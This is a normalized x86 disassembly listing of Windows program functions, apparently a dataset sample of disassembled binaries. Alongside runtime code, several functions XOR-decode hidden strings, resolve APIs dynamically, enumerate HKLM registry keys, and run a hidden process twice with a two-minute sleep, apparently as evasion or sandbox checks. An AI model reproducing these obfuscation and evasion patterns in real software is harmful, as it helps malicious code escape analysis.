mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_40f84f
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40dda0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_412f56
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_40674f
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40ef77
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_402116
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_40f84f
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_40f84f
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_403722
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_4026f7
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_40a117
pop ecx
test eax eax
jne r-xdata
call sub_403722
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_4026f7
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_40d42e
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_4015e5
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_40f0e0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call [ CloseHandle@IAT ]
test eax eax
je r-xdata
neg eax
sbb eax eax
neg eax
dec eax
pop esi
pop ebp
retn
mov ecx [ rw-data ]
mov edx [ rw-data ]
cmp ecx edx
je r-xdata
cmp [ ecx ] esi
je r-xdata
cmp ecx edx
je r-xdata
add ecx 0x8
cmp ecx edx
jne r-xdata
add ecx 0x8
mov esi edx
cmp ecx edx
je r-xdata
neg eax
sbb eax eax
neg eax
dec eax
pop esi
pop ebp
retn
sub edx 0x8
mov [ rw-data ] edx
lea edx [ ecx - 0x8 ]
push edi
mov edi [ ecx ]
mov [ edx ] edi
mov edi [ ecx + 0x4 ]
mov [ edx + 0x4 ] edi
add ecx 0x8
add edx 0x8
cmp ecx esi
jne r-xdata
mov edx [ rw-data ]
pop edi
sub_40f160
push ebp
mov ebp esp
push 0xffffffff
push sub_416073
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
call sub_411b20
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
mov [ esi ] r--data
cmp eax edx
jne r-xdata
mov edi [ eax ]
lea edx [ eax + 0x4 ]
lea eax [ edi + eax + 0x4 ]
sub ecx edi
mov [ ebp - 0x10 ] eax
lea eax [ ecx - 0x4 ]
push eax
mov [ ebp + 0xc ] edx
mov [ esi + 0x18 ] eax
call sub_4066cf
push 0xc
mov [ esi + 0x14 ] eax
call sub_4066cf
mov ebx eax
add esp 0x8
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x1
test ebx ebx
je r-xdata
mov [ esi + 0x14 ] edx
mov [ esi + 0x18 ] edx
jmp r-xdata
xor ecx ecx
push edi
mov [ ebx ] r--data
call sub_4066cf
mov ecx [ ebp + 0xc ]
push edi
push ecx
push eax
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] edi
call sub_415340
add esp 0x10
mov ecx ebx
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x14 ]
mov edx [ ecx ]
mov edx [ edx + 0xc ]
push eax
mov eax [ esi + 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call edx
sub_40f240
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40ab76
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40f280
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ rw-data ] ecx
push esi
mov esi [ r--data ]
mov [ ebp - 0x44 ] eax
xor cl cl
mov [ rw-data ] edx
xor eax eax
mov edi edi
mov dl [ eax + esi ]
xor dl cl
xor dl 0x47
inc cl
mov [ ebp + eax - 0x24 ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x19 ] 0x0
call [ LoadLibraryA@IAT ]
mov ebx eax
mov [ ebp - 0x48 ] ebx
test ebx ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
lea esp [ esp ]
pop esi
xor al al
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
xor dl cl
xor dl 0xba
inc cl
mov [ ebp + eax - 0x10 ] dl
movzx eax cl
cmp eax 0x9
jb r-xdata
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov [ ebp - 0x7 ] 0x0
call esi
mov [ ebp - 0x40 ] eax
test eax eax
je r-xdata
push edi
lea edi [ ebp - 0x18 ]
mov eax 0xc
call sub_408c90
mov ecx edi
push ecx
push ebx
call esi
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
xor al al
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
lea edi [ ebp - 0x30 ]
mov eax 0x1d
call sub_408c90
mov eax [ ebp - 0x48 ]
mov edx edi
push edx
push eax
call esi
mov edi eax
test edi edi
je r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
push 0xffffffff
push sub_40a890
push sub_40f0e0
push sub_401050
push sub_401720
push sub_40dc50
push sub_40b410
push sub_406900
call [ ebp - 0x40 ]
mov esi eax
add esp 0x24
test esi esi
je r-xdata
mov edx [ ebp - 0x44 ]
push edx
push 0x0
push sub_408cd0
push 0x0
push r--data
push r--data
push esi
call ebx
add esp 0x1c
push esi
test eax eax
jne r-xdata
call edi
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
pop esi
xor ecx ebp
mov al 0x1
pop ebx
call sub_401400
mov esp ebp
pop ebp
retn
call edi
add esp 0x4
sub_40f3eb
call sub_401c00
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_402856
pop ecx
push 0x3
call sub_410f49
int3
push 0x1
push 0x40000015
push 0x3
call sub_40b4fd
add esp 0xc
sub_40f420
push ebp
mov ebp esp
sub esp 0xb60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xb5c ] eax
mov [ ebp - 0xb50 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0xb4c ] edx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2d
and edx 0xff
mov [ ebp + eax * 2 - 0xbc ] dx
inc eax
cmp eax 0x33
jb r-xdata
push edi
mov edi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0xb38 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0xbc ]
push edx
push 0x80000002
mov [ ebp - 0x56 ] ax
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0xb38 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xb48 ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xb38 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x2
pop edi
call sub_401400
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xb48 ]
test eax eax
je r-xdata
push ebx
push esi
xor esi esi
mov [ ebp - 0xb3c ] esi
test eax eax
je r-xdata
mov edx [ ebp - 0xb38 ]
push edx
call [ RegCloseKey@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn 0x4
nop
mov ecx [ ebp - 0xb38 ]
push ecx
call [ RegCloseKey@IAT ]
pop esi
pop ebx
mov eax 0x3
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x1c ]
mov eax 0x10
call sub_404a80
lea edx [ ebp - 0x124 ]
mov eax 0x14
call sub_404a80
lea edx [ ebp - 0xb34 ]
push edx
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x734 ]
call sub_407150
add esp 0xc
lea edx [ ebp - 0x34 ]
mov eax 0x1e
call sub_404a80
lea edx [ ebp - 0xb40 ]
push edx
push 0x20119
push 0x0
mov eax ebx
push eax
push 0x80000002
call edi
test eax eax
jne r-xdata
inc esi
mov [ ebp - 0xb3c ] esi
cmp esi [ ebp - 0xb48 ]
jb r-xdata
mov ebx [ RegQueryValueExW@IAT ]
lea ecx [ ebp - 0xb60 ]
push ecx
mov ecx [ ebp - 0xb40 ]
lea edx [ ebp - 0x324 ]
push edx
push eax
push eax
lea eax [ ebp - 0x34 ]
push eax
push ecx
mov [ ebp - 0xb60 ] 0x1fe
call ebx
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0xb38 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0xb58 ]
push edx
lea eax [ ebp - 0xb34 ]
push eax
push esi
push ecx
mov [ ebp - 0xb58 ] 0xff
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0xb38 ]
push edx
call [ RegCloseKey@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0xb40 ]
push edx
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
mov esi [ ebp - 0xb3c ]
lea edx [ ebp - 0x54 ]
lea eax [ esi + 0x1c ]
call sub_404a80
lea eax [ ebp - 0xb44 ]
push eax
push 0x20119
push esi
lea ecx [ ebp - 0x734 ]
push ecx
push 0x80000002
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0xb54 ]
push edx
mov edx [ ebp - 0xb44 ]
lea eax [ ebp - 0x934 ]
push eax
push esi
push esi
lea ecx [ ebp - 0x54 ]
push ecx
push edx
mov [ ebp - 0xb54 ] 0x1fe
call ebx
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0xb44 ]
push eax
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
mov ecx [ ebp - 0xb5c ]
mov esi [ StrStrIW@IAT ]
push ecx
lea edx [ ebp - 0x324 ]
push edx
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0xb50 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax 0x26
call sub_404a80
lea edx [ ebp - 0x934 ]
push edx
lea eax [ ebp - 0x324 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x52c ]
call sub_407150
mov eax ebx
add esp 0xc
lea edx [ eax + 0x2 ]
jmp r-xdata
push eax
lea eax [ ebp - 0x324 ]
push eax
call esi
test eax eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp - 0xb4c ]
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x52c ]
call sub_4067a0
sub_40f7a1
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4042de
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_40f7f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ ebp - 0x4 ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push edx
push eax
lea edx [ ebp + 0x8 ]
push edx
call sub_40d960
mov eax [ eax ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0x1
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0xc ]
mov edi edi
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
cmp esi [ eax + 0xc ]
mov ecx eax
setl dl
mov [ ebp - 0x4 ] dl
test dl dl
je r-xdata
pop esi
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_40f862
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_413d6f
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_40c968
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_40f940
push ebp
mov ebp esp
push 0xffffffff
push sub_416270
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] 0x0
call sub_40140f
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_4037cf
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
call sub_401940
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_4066cf
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_408b16
mov ecx [ ebp + 0x10 ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_415340
mov ecx [ ebp + 0x10 ]
add esp 0xc
sub_40fa7f
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_4037cf
int3
mov eax [ esi ]
push eax
call sub_408b16
add esp 0x4
sub_40fab0
mov eax [ edi + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
push esi
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
pop esi
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_402000
mov esi [ esi ]
push ebx
call sub_408b16
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_40fb00
push ebp
mov ebp esp
sub esp 0x30c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ rw-data ]
push esi
push edi
xor edi edi
push 0x208
lea eax [ ebp - 0x280 ]
push edi
push eax
mov [ ebp - 0x2ac ] edi
mov [ ebp - 0x2b4 ] edi
call sub_413e10
mov ecx [ r--data ]
add esp 0xc
mov [ ebp - 0x284 ] edi
xor eax eax
lea ecx [ ecx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x67
and edx 0xff
mov [ ebp + eax * 2 - 0x60 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov esi [ ebx + 0xda0 ]
xor eax eax
mov [ ebp - 0x4e ] ax
cmp esi [ ebx + 0xda4 ]
je r-xdata
push edi
lea edx [ ebp - 0x2c0 ]
push edx
lea eax [ ebp - 0x2a4 ]
push eax
lea ecx [ ebp - 0x288 ]
push ecx
mov [ ebp - 0x2c0 ] 0xc
mov [ ebp - 0x2b8 ] 0x1
mov [ ebp - 0x2bc ] edi
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
mov edi [ StrStrIW@IAT ]
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x288 ]
push edi
push 0x1
push edx
call [ SetHandleInformation@IAT ]
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0x44
lea eax [ ebp - 0x308 ]
push edi
push eax
call sub_413e10
or [ ebp - 0x2dc ] 0x100
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x2a0 ] eax
mov [ ebp - 0x29c ] eax
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] eax
mov eax [ ebp - 0x2a4 ]
add esp 0xc
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2cc ] eax
mov [ ebp - 0x308 ] 0x44
xor eax eax
lea esp [ esp ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor al al
pop ebx
call sub_401400
mov esp ebp
pop ebp
retn
add esi 0x1c
cmp esi [ ebx + 0xda4 ]
jne r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push eax
call edi
test eax eax
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffe6
and edx 0xff
mov [ ebp + eax * 2 - 0x74 ] dx
inc eax
cmp eax 0x9
jb r-xdata
push 0x104
lea ecx [ ebp - 0x280 ]
push ecx
lea edx [ ebp - 0x74 ]
xor eax eax
push edx
mov [ ebp - 0x62 ] ax
call [ ExpandEnvironmentStringsW@IAT ]
mov ecx [ r--data ]
xor eax eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edi edi
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x6b
and edx 0xff
mov [ ebp + eax * 2 - 0x4c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ CreateProcessW@IAT ]
lea ecx [ ebp - 0x2a0 ]
push ecx
lea edx [ ebp - 0x308 ]
push edx
push edi
push edi
push 0x8000000
push 0x1
xor eax eax
push edi
mov [ ebp - 0x38 ] ax
push edi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x280 ]
push ecx
call ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x2a0 ]
mov esi [ WaitForSingleObject@IAT ]
push 0xffffffff
push edx
call esi
mov edx [ ebp - 0x288 ]
push edi
mov edi [ ReadFile@IAT ]
lea eax [ ebp - 0x284 ]
push eax
push 0x14
lea ecx [ ebp - 0x34 ]
push ecx
push edx
call edi
mov eax [ ebp - 0x284 ]
push 0x1d4c0
mov [ ebp + eax - 0x34 ] 0x0
call [ Sleep@IAT ]
push 0x44
lea ecx [ ebp - 0x308 ]
push 0x0
push ecx
call sub_413e10
or [ ebp - 0x2dc ] 0x100
add esp 0xc
xor eax eax
mov [ ebp - 0x2a0 ] eax
mov [ ebp - 0x29c ] eax
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] eax
mov eax [ ebp - 0x2a4 ]
lea edx [ ebp - 0x2a0 ]
push edx
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2cc ] eax
lea eax [ ebp - 0x308 ]
push eax
push 0x0
push 0x0
push 0x8000000
push 0x1
push 0x0
push 0x0
lea ecx [ ebp - 0x4c ]
push ecx
lea edx [ ebp - 0x280 ]
push edx
mov [ ebp - 0x308 ] 0x44
call ebx
test eax eax
je r-xdata
mov eax [ ebp - 0x2a0 ]
push 0xffffffff
push eax
call esi
mov eax [ ebp - 0x288 ]
xor esi esi
push esi
lea ecx [ ebp - 0x284 ]
push ecx
push 0x14
lea edx [ ebp - 0x20 ]
push edx
push eax
mov [ ebp - 0x284 ] esi
call edi
mov ecx [ ebp - 0x284 ]
mov [ ebp + ecx - 0x20 ] 0x0
mov ebx esi
inc esi
cmp esi 0x14
jb r-xdata
movsx eax [ ebp + esi - 0x20 ]
push eax
call sub_404ad7
add esp 0x4
test eax eax
jne r-xdata
movsx edx [ ebp + esi - 0x34 ]
push edx
call sub_404ad7
add esp 0x4
test eax eax
jne r-xdata
mov ebx [ ebp - 0x2ac ]
jmp r-xdata
mov edi [ r--data ]
xor cl cl
xor eax eax
inc esi
cmp esi 0x14
jb r-xdata
xor esi esi
jmp r-xdata
mov dl [ eax + edi ]
xor dl cl
xor dl 0xf8
inc cl
mov [ ebp + eax - 0xc ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x290 ]
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp + ebx - 0x34 ]
push eax
mov [ ebp - 0x7 ] 0x0
call sub_401b43
lea ecx [ ebp - 0x28c ]
push ecx
lea edx [ ebp - 0x2b0 ]
push edx
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp + esi - 0x20 ]
push ecx
call sub_401b43
mov edx [ ebp - 0x2b0 ]
add esp 0x20
sub edx [ ebp - 0x2a8 ]
je r-xdata
mov esi [ ebp - 0x2b4 ]
mov ecx [ ebp - 0x28c ]
sub ecx [ ebp - 0x290 ]
cmp ecx 0x2
jge r-xdata
mov eax [ ebp - 0x28c ]
sub eax [ ebp - 0x290 ]
add eax 0x3c
cmp eax 0x2
jge r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
sub_40ff10
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
call sub_40fab0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
push edx
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_403dd0
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
